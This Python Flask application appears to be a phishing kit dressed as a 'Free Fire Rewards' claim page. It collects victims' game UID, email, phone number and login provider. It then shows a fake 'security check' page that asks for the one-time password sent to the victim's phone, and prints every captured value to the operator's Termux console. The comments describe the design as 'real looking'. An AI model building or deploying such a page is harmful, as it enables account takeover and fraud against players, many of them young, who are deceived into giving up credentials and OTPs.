from flask import Flask, request, render_template_string

app = Flask(__name__)

# 1. Aapka Background Poster
BG_URL = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/22574.jpg"

# 2. Real Looking Professional Design
HTML_TEMPLATE = f'''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Free Fire Rewards - Claim Now</title>
    <style>
        body {{
            background-image: url('{BG_URL}');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            margin: 0; font-family: 'Roboto', sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }}
        .overlay {{ background: rgba(0, 0, 0, 0.4); width: 100%; height: 100%; position: fixed; top: 0; left: 0; z-index: -1; }}
        .form-box {{
            background: white; padding: 30px; border-radius: 12px;
            text-align: center; width: 340px; box-shadow: 0 15px 35px rgba(0,0,0,0.6);
            border-top: 5px solid #1a73e8;
        }}
        h2 {{ color: #1a73e8; font-size: 22px; margin-bottom: 10px; }}
        p {{ color: #555; font-size: 14px; margin-bottom: 20px; }}
        input, select {{ 
            width: 100%; padding: 14px; margin: 10px 0; 
            border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; 
            font-size: 15px; background: #f9f9f9;
        }}
        .blue-btn {{ 
            background: #1a73e8; color: white; border: none; padding: 15px; 
            width: 100%; border-radius: 6px; font-weight: bold; 
            cursor: pointer; font-size: 16px; transition: 0.3s;
        }}
        .blue-btn:hover {{ background: #1557b0; }}
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="form-box">
        <h2>💎 CLAIM REWARDS 💎</h2>
        <p>Login to your account to receive rewards</p>
        <form action="/submit" method="post">
            <input type="text" name="uid" placeholder="Free Fire Player ID (UID)" required>
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="text" name="phone" placeholder="Mobile Number" required>
            
            <select name="account_type">
                <option value="Google">Google Account</option>
                <option value="Facebook">Facebook Account</option>
                <option value="VK">VK Account</option>
                <option value="X (Twitter)">X (Twitter)</option>
            </select>
            
            <button type="submit" class="blue-btn">PROCEED</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/submit', methods=['POST'])
def submit():
    # Termux par data print karna
    uid = request.form.get('uid')
    email = request.form.get('email')
    phone = request.form.get('phone')
    acc = request.form.get('account_type')

    print(f"\n[🔥 NEW DATA RECEIVED 🔥]")
    print(f"UID      : {uid}")
    print(f"Email    : {email}")
    print(f"Phone    : {phone}")
    print(f"Account  : {acc}")
    print("-" * 25)

    return f'''
    <body style="text-align:center; padding-top:100px; font-family:sans-serif; background:#f0f2f5; margin:0;">
        <div style="background:white; display:inline-block; padding:40px; border-radius:15px; box-shadow:0 10px 20px rgba(0,0,0,0.1); border-top: 5px solid #1a73e8;">
            <h2 style="color:#1a73e8;">SECURITY CHECK</h2>
            <p>A 6-digit OTP has been sent to <b>{phone}</b></p>
            <form action="/final" method="post">
                <input type="text" name="otp" placeholder="Enter 6-digit OTP" maxlength="6" required 
                       style="font-size:22px; text-align:center; padding:12px; width:220px; border:1px solid #ddd; border-radius:8px;"><br><br>
                <button type="submit" style="background:#1a73e8; color:white; padding:15px 50px; border:none; border-radius:8px; cursor:pointer; font-weight:bold;">VERIFY OTP</button>
            </form>
        </div>
    </body>
    '''

@app.route('/final', methods=['POST'])
def final():
    otp = request.form.get('otp')
    print(f"OTP RECEIVED: {otp}")
    print("-" * 25 + "\n")
    return "<h1 style='text-align:center; margin-top:100px; color:#1a73e8;'>Verification Completed!<br>Processing rewards...</h1>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
